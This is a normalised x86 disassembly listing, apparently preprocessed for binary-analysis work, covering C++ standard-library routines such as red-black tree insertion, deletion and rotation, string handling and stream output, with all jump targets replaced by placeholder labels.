mov eax [ ebx ]
mov ecx [ ebx + 0x4 ]
push ebx
mov [ eax + 0x4 ] ecx
call sub_42412e
dec [ edi + 0x18 ]
pop ecx
mov [ esp + 0x1c ] ebx
sub_40f214
push 0x0
mov eax sub_43bffe
call sub_425dad
mov esi [ ebp + 0x8 ]
push 0x4
call sub_4246c6
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
and [ ebp - 0x4 ] 0x0
call sub_40f52b
and [ esi + 0x18 ] 0x0
mov [ esi + 0x14 ] eax
mov eax esi
call sub_425e4c
retn 0x4
sub_40f251
mov eax [ esi + 0x14 ]
push edi
mov edi [ eax ]
mov [ eax ] eax
mov eax [ esi + 0x14 ]
mov [ eax + 0x4 ] eax
and [ esi + 0x18 ] 0x0
cmp edi [ esi + 0x14 ]
je r-xdata
push [ esi + 0x14 ]
call sub_42412e
push [ esi ]
and [ esi + 0x14 ] 0x0
call sub_42412e
pop ecx
pop ecx
pop edi
retn
push ebx
mov ebx [ edi ]
push 0x0
push 0x1
lea ecx [ edi + 0x28 ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ edi + 0xc ]
call sub_40415f
push edi
call sub_42412e
pop ecx
mov edi ebx
cmp ebx [ esi + 0x14 ]
jne r-xdata
pop ebx
sub_40f2a9
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ eax ]
jmp r-xdata
call sub_423d5c
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x14 ]
jne r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
add eax 0x8
retn
call sub_423d5c
sub_40f2d4
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ eax ]
jmp r-xdata
call sub_423d5c
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x18 ]
jne r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
add eax 0xc
retn
call sub_423d5c
sub_40f2ff
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx eax
xor eax eax
push esi
push edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x1c ] eax
jne r-xdata
mov eax [ ebx + 0x18 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
lea edi [ ebp - 0x10 ]
lea esi [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
call sub_40f543
test al al
je r-xdata
mov ecx [ ebx + 0x18 ]
mov eax [ ebx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
lea edi [ ebp - 0x10 ]
lea esi [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
call sub_40f543
test al al
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
add ecx 0xc
call sub_405664
test al al
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
mov ecx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
add ecx 0xc
mov eax edi
call sub_405664
test al al
je r-xdata
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp + 0xc ]
add eax 0xc
call sub_405664
test al al
je r-xdata
push [ ebp + 0xc ]
push ebx
lea ebx [ ebp - 0x14 ]
call sub_40f5f8
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
mov ecx [ ebp + 0x14 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
add eax 0xc
mov ecx edi
call sub_405664
test al al
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_40f809
mov eax [ eax + 0x4 ]
add eax 0xc
mov ecx edi
call sub_405664
test al al
je r-xdata
push [ ebp + 0xc ]
mov eax [ ebx + 0x18 ]
mov ecx [ eax + 0x8 ]
push 0x0
jmp r-xdata
push [ ebp + 0xc ]
push 0x1
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
call sub_4132aa
lea edi [ ebp - 0x10 ]
mov esi eax
call sub_40f543
test al al
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x31 ] 0x0
push edi
mov esi ebx
je r-xdata
mov esi ebx
mov ecx [ ebp + 0x14 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x31 ] 0x0
push [ ebp + 0xc ]
mov esi ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
add ecx 0xc
call sub_405664
test al al
je r-xdata
mov ecx [ ebp + 0x14 ]
push 0x1
jmp r-xdata
push 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push 0x1
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40f6bc
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_40f491
push ebp
mov ebp esp
push ecx
mov eax [ edi + 0x18 ]
push esi
mov esi [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ esi + 0x31 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ esi + 0xc ]
call sub_405664
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ edi ]
mov [ ebx ] eax
mov eax ebx
pop esi
leave
retn 0x4
mov [ ebp - 0x4 ] esi
mov esi [ esi ]
mov esi [ esi + 0x8 ]
jmp r-xdata
sub_40f4d1
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x31 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
jmp r-xdata
mov [ edx ] eax
mov [ edx + 0x8 ] eax
jmp r-xdata
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_40f55e
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
push ebx
push esi
mov esi [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
mov ebx eax
jmp r-xdata
cmp [ esi + 0x2d ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
lea eax [ esi + 0xc ]
call sub_405664
test al al
je r-xdata
cmp [ ebx + 0x2d ] 0x0
je r-xdata
cmp [ ebx + 0x2d ] 0x0
je r-xdata
mov esi [ esi + 0x8 ]
jmp r-xdata
mov esi [ ebx ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov esi [ esi ]
mov eax [ ebp + 0xc ]
lea ecx [ esi + 0xc ]
call sub_405664
test al al
je r-xdata
cmp [ esi + 0x2d ] 0x0
je r-xdata
mov ebx esi
mov eax [ ebp + 0xc ]
lea ecx [ esi + 0xc ]
call sub_405664
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov ecx [ ebp - 0x4 ]
pop esi
mov [ edi ] eax
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] ebx
mov [ edi + 0x4 ] ecx
mov eax edi
pop ebx
leave
retn 0x8
mov esi [ esi + 0x8 ]
mov ebx esi
mov esi [ esi ]
jmp r-xdata
sub_40f5f8
push ebp
mov ebp esp
sub esp 0x18
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
push edi
mov edi [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
cmp [ edi + 0x31 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
lea ecx [ edi + 0xc ]
mov [ ebp - 0x4 ] edi
call sub_405664
mov [ ebp - 0x8 ] al
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi [ ebp - 0x4 ]
mov eax [ esi ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] eax
je r-xdata
mov edi [ edi + 0x8 ]
mov edi [ edi ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
lea eax [ edi + 0xc ]
call sub_405664
test al al
je r-xdata
mov ecx [ esi + 0x18 ]
mov ecx [ ecx ]
lea edi [ ebp - 0x18 ]
lea esi [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] eax
call sub_40f543
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
jmp r-xdata
lea esi [ ebp - 0x10 ]
call sub_40f809
mov edi [ ebp - 0xc ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x1
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_40f6bc
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebx ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
pop edi
mov eax ebx
pop esi
leave
retn 0x8
sub_40f6bc
push 0x48
mov eax sub_43b0d8
call sub_425dad
mov edi ecx
cmp [ esi + 0x1c ] 0x71c71c6
jb r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ ebp + 0x10 ]
push eax
push edi
push eax
call sub_40f90d
inc [ esi + 0x1c ]
mov ebx eax
mov eax [ esi + 0x18 ]
cmp edi eax
jne r-xdata
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_401065
push r--data
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x54 ] r--data
call sub_42597b
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ eax + 0x4 ] ebx
mov eax [ esi + 0x18 ]
mov [ eax ] ebx
mov eax [ esi + 0x18 ]
jmp r-xdata
mov [ edi + 0x8 ] ebx
mov eax [ esi + 0x18 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ edi ] ebx
mov eax [ esi + 0x18 ]
cmp edi [ eax ]
jne r-xdata
mov [ eax + 0x8 ] ebx
mov edi ebx
lea eax [ ebx + 0x4 ]
jmp r-xdata
mov [ eax ] ebx
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x30 ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x30 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ esi ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ecx
call sub_425e4c
retn 0xc
mov edx [ edx ]
cmp [ edx + 0x30 ] 0x0
jne r-xdata
mov edx [ edx + 0x8 ]
cmp [ edx + 0x30 ] 0x0
je r-xdata
cmp edi [ ecx ]
jne r-xdata
mov [ ecx + 0x30 ] 0x1
mov [ edx + 0x30 ] 0x1
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0x30 ] 0x0
mov eax [ eax ]
mov edi [ eax + 0x4 ]
jmp r-xdata
cmp edi [ ecx + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x30 ] 0x1
mov eax [ edi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x30 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x4 ]
push esi
call sub_4131e9
push esi
mov edi ecx
call sub_40f4d1
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
mov [ eax + 0x30 ] 0x1
mov eax [ edi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x30 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x4 ]
push esi
call sub_40f4d1
jmp r-xdata
push esi
mov edi ecx
call sub_4131e9
sub_40f809
push ebx
xor ebx ebx
cmp [ esi ] ebx
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x31 ] bl
je r-xdata
call sub_423d5c
mov ecx [ eax ]
cmp [ ecx + 0x31 ] bl
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ esi + 0x4 ] eax
cmp [ eax + 0x31 ] bl
je r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax + 0x31 ] bl
je r-xdata
jmp r-xdata
mov eax esi
pop ebx
retn
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ esi + 0x4 ]
cmp [ ecx + 0x31 ] bl
je r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x31 ] bl
je r-xdata
call sub_423d5c
jmp r-xdata
mov [ esi + 0x4 ] eax
mov [ esi + 0x4 ] eax
mov ecx eax
mov [ esi + 0x4 ] ecx
jmp r-xdata
sub_40f86a
push ebx
xor ebx ebx
cmp [ esi ] ebx
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x2d ] bl
je r-xdata
call sub_423d5c
mov ecx [ eax ]
cmp [ ecx + 0x2d ] bl
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ esi + 0x4 ] eax
cmp [ eax + 0x2d ] bl
je r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax + 0x2d ] bl
je r-xdata
jmp r-xdata
mov eax esi
pop ebx
retn
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ esi + 0x4 ]
cmp [ ecx + 0x2d ] bl
je r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x2d ] bl
je r-xdata
call sub_423d5c
jmp r-xdata
mov [ esi + 0x4 ] eax
mov [ esi + 0x4 ] eax
mov ecx eax
mov [ esi + 0x4 ] ecx
jmp r-xdata
sub_40f8cb
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x2d ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
jmp r-xdata
mov [ edx ] eax
mov [ edx + 0x8 ] eax
jmp r-xdata
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_40f90d
push 0xc
mov eax sub_43a8ed
call sub_425de0
mov ebx ecx
push 0x34
call sub_4246c6
and [ ebp - 0x4 ] 0x0
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
mov eax esi
call sub_425e4c
retn 0xc
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x10 ]
lea edi [ esi + 0xc ]
push ebx
mov ecx edi
mov [ esi + 0x8 ] eax
call sub_403de3
mov eax [ ebx + 0x1c ]
mov [ edi + 0x1c ] eax
mov eax [ ebx + 0x20 ]
mov [ edi + 0x20 ] eax
mov [ esi + 0x30 ] 0x0
mov [ esi + 0x31 ] 0x0
sub_40f984
push 0x20
mov eax sub_43af73
call sub_425dad
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_403dc1
mov esi eax
mov eax [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
call sub_404233
mov ecx [ ebp + 0x8 ]
push eax
call sub_403de3
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
mov eax [ ebp + 0x8 ]
call sub_425e4c
retn
sub_40f9cf
push 0x20
mov eax sub_43af73
call sub_425dad
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_403de3
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push eax
call sub_403fa5
mov ecx [ ebp + 0x8 ]
push eax
call sub_403de3
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
mov eax [ ebp + 0x8 ]
call sub_425e4c
retn
sub_40fa15
push 0x20
mov eax sub_43af73
call sub_425dad
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_403de3
mov esi eax
mov eax [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
call sub_404233
mov ecx [ ebp + 0x8 ]
push eax
call sub_403de3
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
mov eax [ ebp + 0x8 ]
call sub_425e4c
retn
sub_40fac5
push 0x40
mov eax sub_43d9b3
call sub_425dad
and [ ebp - 0x10 ] 0x0
push r--data
lea ecx [ ebp - 0x48 ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
push [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_413567
add esp 0xc
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_40415f
mov eax [ ebp + 0x8 ]
call sub_425e4c
retn
sub_40fb5d
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ecx
mov eax [ esi + 0x18 ]
mov ecx [ esi ]
mov edx [ eax ]
push eax
push ecx
push edx
push ecx
lea eax [ esp + 0x10 ]
push eax
mov eax esi
call sub_40fb91
push [ esi + 0x18 ]
call sub_42412e
and [ esi + 0x18 ] 0x0
and [ esi + 0x1c ] 0x0
pop ecx
mov esp ebp
pop ebp
retn
sub_40fb91
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
mov eax [ eax ]
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebx ]
push edi
lea edi [ ebp - 0xc ]
lea esi [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
call sub_40f543
test al al
je r-xdata
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_40f543
test al al
je r-xdata
mov eax [ ebx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx ]
lea edi [ ebp - 0xc ]
lea esi [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
call sub_40f543
test al al
je r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea esi [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
call sub_41bfbb
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push eax
push ebx
call sub_40fc47
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov ebx [ ebx ]
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov eax [ ebx + 0x18 ]
push [ eax + 0x4 ]
mov ecx ebx
call sub_41c1da
mov eax [ ebx + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ ebx + 0x18 ]
and [ ebx + 0x1c ] 0x0
mov [ eax ] eax
mov eax [ ebx + 0x18 ]
mov [ eax + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebx ]
mov [ eax ] ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x14
sub_40fc47
push 0x4c
mov eax sub_43b016
call sub_425dad
mov ebx [ ebp + 0x14 ]
cmp [ ebx + 0x2d ] 0x0
je r-xdata
lea esi [ ebp + 0x10 ]
call sub_41bfbb
mov edx [ ebx ]
cmp [ edx + 0x2d ] 0x0
je r-xdata
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x58 ]
call sub_401065
push r--data
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x58 ] r--data
call sub_42597b
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x2d ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
lea ecx [ eax + 0x8 ]
mov edi [ ecx ]
cmp eax ebx
jne r-xdata
mov edi edx
jmp r-xdata
cmp [ edi + 0x2d ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov edx [ ebx ]
mov [ eax ] edx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x18 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x2d ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov edx [ ebx + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebx + 0x8 ]
mov [ ecx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x18 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov edx [ ecx + 0x18 ]
cmp [ edx ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x18 ]
cmp [ edx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x2d ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov [ eax + 0x4 ] ecx
lea ecx [ ebx + 0x2c ]
add eax 0x2c
cmp eax ecx
je r-xdata
cmp [ ebx + 0x2c ] 0x1
jne r-xdata
cmp [ edi + 0x2d ] 0x0
je r-xdata
mov eax [ edi ]
mov ecx edi
jmp r-xdata
mov ecx esi
jmp r-xdata
mov dl [ eax ]
mov [ ebp - 0x11 ] dl
mov dl [ ecx ]
mov [ eax ] dl
mov al [ ebp - 0x11 ]
mov [ ecx ] al
push 0x0
push 0x1
lea ecx [ ebx + 0xc ]
call sub_40415f
push ebx
call sub_42412e
mov eax [ ebp + 0x8 ]
pop ecx
mov ecx [ eax + 0x1c ]
test ecx ecx
jbe r-xdata
jmp r-xdata
mov eax [ edi + 0x8 ]
mov ecx edi
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ eax + 0x2d ] 0x0
je r-xdata
mov [ edx ] ecx
mov edx [ eax ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x14 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
call sub_425e4c
retn 0x10
dec ecx
mov [ eax + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
cmp edi [ eax + 0x4 ]
jne r-xdata
cmp [ eax + 0x2d ] 0x0
je r-xdata
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ edi + 0x2c ] 0x1
jne r-xdata
jmp r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
mov [ edi + 0x2c ] 0x1
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
cmp [ ecx + 0x2d ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x2c ] 0x1
mov ecx esi
mov [ esi + 0x2c ] 0x0
call sub_40f8cb
mov ecx [ esi ]
cmp [ ecx + 0x2d ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x2c ] 0x1
mov ecx esi
mov [ esi + 0x2c ] 0x0
call sub_41c218
mov ecx [ esi + 0x8 ]
mov edi esi
mov esi [ esi + 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x2c ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x2c ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x2c ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x2c ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x2c ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x2c ] 0x1
je r-xdata
mov al [ esi + 0x2c ]
push [ ebp + 0x8 ]
mov [ ecx + 0x2c ] al
mov [ esi + 0x2c ] 0x1
mov eax [ ecx ]
mov ecx esi
mov [ eax + 0x2c ] 0x1
call sub_40f8cb
mov eax [ ecx + 0x8 ]
push [ ebp + 0x8 ]
mov [ eax + 0x2c ] 0x1
mov [ ecx + 0x2c ] 0x0
call sub_41c218
mov ecx [ esi ]
mov [ ecx + 0x2c ] 0x0
mov al [ esi + 0x2c ]
push [ ebp + 0x8 ]
mov [ ecx + 0x2c ] al
mov [ esi + 0x2c ] 0x1
mov eax [ ecx + 0x8 ]
mov ecx esi
mov [ eax + 0x2c ] 0x1
call sub_41c218
jmp r-xdata
mov eax [ ecx ]
push [ ebp + 0x8 ]
mov [ eax + 0x2c ] 0x1
mov [ ecx + 0x2c ] 0x0
call sub_40f8cb
mov ecx [ esi + 0x8 ]
sub_40feed
push 0x14
mov eax sub_43ea5a
call sub_425de0
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x18 ] ebx
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
mov esi eax
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x18 ]
cmp eax ebx
jle r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_4094e6
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
cmp eax esi
jle r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
sub eax esi
mov ebx eax
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x28 ]
mov eax [ ecx ]
push esi
push [ ebp + 0xc ]
call [ eax + 0x20 ]
cmp eax esi
je r-xdata
test ebx ebx
jle r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
test ebx ebx
jle r-xdata
mov [ ebp - 0x18 ] 0x4
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov dl [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
mov ecx eax
call sub_409384
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call sub_409545
mov eax edi
call sub_425e4c
retn
push 0x0
push [ ebp - 0x18 ]
call sub_408b69
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
and [ eax + 0x18 ] 0x0
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov dl [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
mov ecx eax
call sub_409384
cmp eax 0xffffffff
jne r-xdata
dec ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x4
dec ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x4
jmp r-xdata
sub_410005
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_406490
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_41005e
push 0x0
mov eax sub_43aff3
call sub_425dad
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov edi esi
call sub_40fa78
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x10 ]
lea edi [ esi + 0x30 ]
mov [ esi ] r--data
mov [ esi + 0x2c ] eax
call sub_416ff0
lea edi [ esi + 0x34 ]
